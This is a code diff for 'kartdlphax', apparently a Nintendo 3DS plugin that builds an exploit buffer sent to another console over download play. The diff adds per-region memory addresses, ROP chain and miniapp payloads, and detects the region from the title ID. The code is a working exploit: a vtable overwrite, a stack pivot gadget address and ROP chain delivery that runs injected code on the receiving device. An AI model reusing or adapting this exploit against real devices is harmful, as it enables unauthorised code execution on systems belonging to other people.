@@ -4,8 +4,12 @@
 #include "PatternManager.hpp"
 #include "OSDManager.hpp"
 #include "rt.h"
-#include "ropbin.h"
-#include "miniapp.h"
+#include "ropbin_eur.h"
+#include "miniapp_eur.h"
+#include "ropbin_usa.h"
+#include "miniapp_usa.h"
+#include "ropbin_jap.h"
+#include "miniapp_jap.h"
 #include "otherapp.h"
 
 #include <vector>
@@ -76,16 +80,39 @@ namespace CTRPluginFramework
     static constexpr u32 TRANSFERBLOCKSIZE = 0x37C;                             // The size in bytes of a single transfer block.
 
 	u32 pwnBuffer[TRANSFERBLOCKSIZE / 4] = { 0 };                                // Buffer sent with the vtable pwn
+    int gameRegion = -1;                                                         // Region of the game. EUR -> 0, USA -> 1, JAP -> 2
 
     static constexpr u32 VTABLEPWNBLOCK = 0x1740;                               // Block in the buffer that cointains the vtable pwn
     static constexpr u32 ORIGSTACK = 0x0FFFFDC8;                                // Original stack addr when the vtable pwn exploit triggers
     static constexpr u32 LDR0TOR3 = 0x0012E54C;                                 // Jumping here loads [R0, #0x8] into R3
     static constexpr u32 STACKPIVOT = 0x00113688;                               // Jumping here can control SP + PC from value in R3
     static constexpr u32 PLUGINBUFFERSIZE = TRANSFERBLOCKSIZE * 0xA82;          // Size of the fake sent buffer ~2.4MB
-    static constexpr u32 STARTBUFFER = 0x1424FDB4;                              // Start of the recv buffer in the client application
-    static constexpr u32 ROPBUF = STARTBUFFER + 8;                              // Start of the ROP in the client application
-    static constexpr u32 MINIAPPBUF = 0x14253000;                               // Start of the miniapp in the client application, page aligned
-    static constexpr u32 OTHERAPPBUF = STARTBUFFER + TRANSFERBLOCKSIZE * 16;    // Start of the otherapp in the client application
+    static constexpr u32 STARTBUFFER[] = {                                      // Start of the recv buffer in the client application
+        0x1424FDB4,
+        0x1424F774,
+        0x1424F524
+    }; //                             
+    static constexpr u32 ROPBUF[] = {                                           // Start of the ROP in the client application
+        STARTBUFFER[0] + 8,
+        STARTBUFFER[1] + 8,
+        STARTBUFFER[2] + 8
+    };                              
+    static constexpr u32 MINIAPPBUF[] = {                                       // Start of the miniapp in the client application, page aligned
+        0x14253000, 
+        0x14254000,
+        0x14254000
+    };                              
+    static constexpr u32 OTHERAPPBUF[] = {                                      // Start of the otherapp in the client application
+        STARTBUFFER[0] + TRANSFERBLOCKSIZE * 16, 
+        STARTBUFFER[1] + TRANSFERBLOCKSIZE * 22, 
+        STARTBUFFER[2] + TRANSFERBLOCKSIZE * 24
+    };
+
+    const unsigned char* ropbin_addr[] = {payload_eur_bin, payload_usa_bin, payload_jap_bin};
+    const long int ropbin_size[] = {payload_eur_bin_size, payload_usa_bin_size, payload_jap_bin_size};
+
+    const unsigned char* miniapp_addr[] = {miniapp_eur_bin, miniapp_usa_bin, miniapp_jap_bin};
+    const long int miniapp_size[] = {miniapp_eur_bin_size, miniapp_usa_bin_size, miniapp_jap_bin_size};
 
     static u8* exploitBuffer = nullptr; // Fake buffer to be sent
 
@@ -105,14 +132,14 @@ namespace CTRPluginFramework
             //     However, the value of R0 comes from the buffer, so we can call a function that sets up R3 from R0 first.
             //     After R3 is properly set up, we can jump to the stack pivot and start the ROP chain stored in the recieve buffer.
 
-			pwnBuffer[0x35] = STARTBUFFER + VTABLEPWNBLOCK * TRANSFERBLOCKSIZE + 0x37 * 4; // Start buffer + pwn block + offset in current block
+			pwnBuffer[0x35] = STARTBUFFER[gameRegion] + VTABLEPWNBLOCK * TRANSFERBLOCKSIZE + 0x37 * 4; // Start buffer + pwn block + offset in current block
 			pwnBuffer[0x37] = 0;
 			pwnBuffer[0x38] = 0;
 			pwnBuffer[0x39] = 0;
 			pwnBuffer[0x3A] = LDR0TOR3;
 
-			pwnBuffer[0x11] = ROPBUF - ORIGSTACK - 2;
-			pwnBuffer[0x43] = STARTBUFFER + VTABLEPWNBLOCK * TRANSFERBLOCKSIZE + 0x43 * 4; // Start buffer + pwn block + offset in current block
+			pwnBuffer[0x11] = ROPBUF[gameRegion] - ORIGSTACK - 2;
+			pwnBuffer[0x43] = STARTBUFFER[gameRegion] + VTABLEPWNBLOCK * TRANSFERBLOCKSIZE + 0x43 * 4; // Start buffer + pwn block + offset in current block
 			pwnBuffer[0x49] = STACKPIVOT;
 
 			currblock++;
@@ -167,38 +194,40 @@ namespace CTRPluginFramework
         if (!exploitBuffer) svcBreak(USERBREAK_USER);
 
         // Copy the rop chain and the miniapp to to the exploit buffer.
-        memcpy((exploitBuffer + ROPBUF - STARTBUFFER), payload_bin, payload_bin_size);
-        memcpy((exploitBuffer + MINIAPPBUF - STARTBUFFER), miniapp_bin, miniapp_bin_size);
+        memcpy((exploitBuffer + ROPBUF[gameRegion] - STARTBUFFER[gameRegion]), ropbin_addr[gameRegion], ropbin_size[gameRegion]);
+        memcpy((exploitBuffer + MINIAPPBUF[gameRegion] - STARTBUFFER[gameRegion]), miniapp_addr[gameRegion], miniapp_size[gameRegion]);
 
         // Try opening the otherapp file from SD.
-        File otherapp("/kartdlphax_otherapp.bin", File::READ);
-        if (otherapp.IsOpen())
         {
-            // Read the otherapp file into the first copy in the buffer.
-            usedotherapp = 0;
-            otherappsize = otherapp.GetSize();
-            otherapp.Read((exploitBuffer + OTHERAPPBUF - STARTBUFFER), otherappsize);
-        } else {
-            // Copy the built-in otherapp into the first copy in the buffer.
-            usedotherapp = 1;
-            otherappsize = otherapp_bin_size;
-            memcpy((exploitBuffer + OTHERAPPBUF - STARTBUFFER), otherapp_bin, otherappsize);
+            File otherappFile("/kartdlphax_otherapp.bin", File::READ);
+            if (otherappFile.IsOpen())
+            {
+                // Read the otherapp file into the first copy in the buffer.
+                usedotherapp = 0;
+                otherappsize = otherappFile.GetSize();
+                otherappFile.Read((exploitBuffer + OTHERAPPBUF[gameRegion] - STARTBUFFER[gameRegion]), otherappsize);
+            } else {
+                // Copy the built-in otherapp into the first copy in the buffer.
+                usedotherapp = 1;
+                otherappsize = otherapp_bin_size;
+                memcpy((exploitBuffer + OTHERAPPBUF[gameRegion] - STARTBUFFER[gameRegion]), otherapp_bin, otherappsize);
+            }
         }
 
         // Round the otherapp size to next block size and calculate the repeat times.
         otherappsize = roundUp(otherappsize, TRANSFERBLOCKSIZE);
-        u32 repeatTimes = (PLUGINBUFFERSIZE - (OTHERAPPBUF - STARTBUFFER)) / otherappsize;
+        u32 repeatTimes = (PLUGINBUFFERSIZE - (OTHERAPPBUF[gameRegion] - STARTBUFFER[gameRegion])) / otherappsize;
 
         // Set the first u32 in each block in the otherapp to a magic value, so miniapp can differentiate it with a missing block.
         for (int i = 0; i < otherappsize / TRANSFERBLOCKSIZE; i++) {
-            u32* block = (u32*)((exploitBuffer + OTHERAPPBUF - STARTBUFFER) + TRANSFERBLOCKSIZE * i);
+            u32* block = (u32*)((exploitBuffer + OTHERAPPBUF[gameRegion] - STARTBUFFER[gameRegion]) + TRANSFERBLOCKSIZE * i);
             if (block[0] == 0)
                 block[0] = 0x05500000;
         }
 
         // Repeat the first copy of otherapp until it fills the entire exploit buffer.
         for (int i = 1; i < repeatTimes; i++) {
-            memcpy((exploitBuffer + OTHERAPPBUF - STARTBUFFER) + otherappsize * i, (exploitBuffer + OTHERAPPBUF - STARTBUFFER), otherappsize);
+            memcpy((exploitBuffer + OTHERAPPBUF[gameRegion] - STARTBUFFER[gameRegion]) + otherappsize * i, (exploitBuffer + OTHERAPPBUF[gameRegion] - STARTBUFFER[gameRegion]), otherappsize);
         };
 
         // Set the otherapp size and repeated times.
@@ -217,10 +246,35 @@ namespace CTRPluginFramework
     {
         LightEvent_Init(&exitEvent, RESET_ONESHOT);
 
-        constructExploitBuffer();
+        u32 tidLow = (u32)Process::GetTitleID();
+        switch (tidLow)
+        {
+        case 0x00030700:
+            gameRegion = 0;
+            break;
+        case 0x00030800:
+            gameRegion = 1;
+            break;
+        case 0x00030600:
+            gameRegion = 2;
+            break;
+        default:
+            break;
+        }
 
         OSD::Notify("Welcome!");
-        OSD::Notify("kartdlphax v1.0");
+        OSD::Notify("kartdlphax v1.1");
+        if (gameRegion != -1) {
+            const char* regTexts[] {"Europe", "America", "Japan"};
+            OSD::Notify(std::string("Region: ") + regTexts[gameRegion]);
+        } else {
+            OSD::Notify("Unsupported region :(");
+            Sleep(Seconds(5.f));
+            Process::ReturnToHomeMenu();
+        }
+
+        constructExploitBuffer();
+        
         OSD::Notify((usedotherapp == 0) ? "Using otherapp file from SD." : "Using built-in universal otherapp.");
 
         // Wait for process exit event.
